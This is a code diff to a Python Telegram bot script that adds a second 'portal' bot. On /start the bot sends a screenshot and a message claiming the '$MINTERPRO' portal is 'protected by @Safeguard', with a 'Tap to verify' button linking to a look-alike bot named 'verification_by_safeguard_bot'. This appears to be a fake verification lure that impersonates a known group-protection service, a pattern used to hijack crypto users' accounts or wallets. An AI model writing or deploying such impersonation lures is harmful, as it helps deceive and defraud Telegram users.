@@ -15,8 +15,11 @@ load_dotenv()
 api_id = os.getenv('API_ID')
 api_hash = os.getenv('API_HASH')
 bot_token = os.getenv('GROUP_BOT_TOKEN')
+portal_bot_token = os.getenv('PORTAL_BOT_TOKEN')
 
 bot_client = TelegramClient('group_bot', api_id, api_hash).start(bot_token=bot_token)
+
+portal_bot_client = TelegramClient('portal_bot', api_id, api_hash).start(bot_token=portal_bot_token)
 
 # Event handler for /start command
 # Event handler for /start command
@@ -100,6 +103,37 @@ async def on_verify_button_click(event):
     except Exception as e:
         await event.respond("Error: Unable to process your request.")
 
+
+
+#PORTAL BOT
+@portal_bot_client.on(events.NewMessage(pattern='/start'))
+async def on_portal_access(event):
+    try:
+        # Download the image from the URL using aiohttp
+        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'
+
+        async with aiohttp.ClientSession() as session:
+            async with session.get(image_url) as response:
+                if response.status == 200:
+                    from io import BytesIO  # Import BytesIO here to avoid unnecessary global imports
+                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
+                    image_data.name = 'image_verify_portal.jpg'  # Set a name for the file-like object
+
+                    # Send the final message with the image and buttons
+                    await event.respond(
+                        file=image_data,  # Send the image as bytes with a name
+                        message=(
+                            "$MINTERPRO | PORTAL is being protected by @Safeguard\n\n"
+                            "Click below to verify you're human"
+                        ),
+                        buttons=[
+                            [Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
+                        ]
+                    )
+                else:
+                    print("Failed to fetch the image from the provided URL.")
+    except Exception as e:
+        await event.respond("Error: Unable to process your request.")
         
 
 
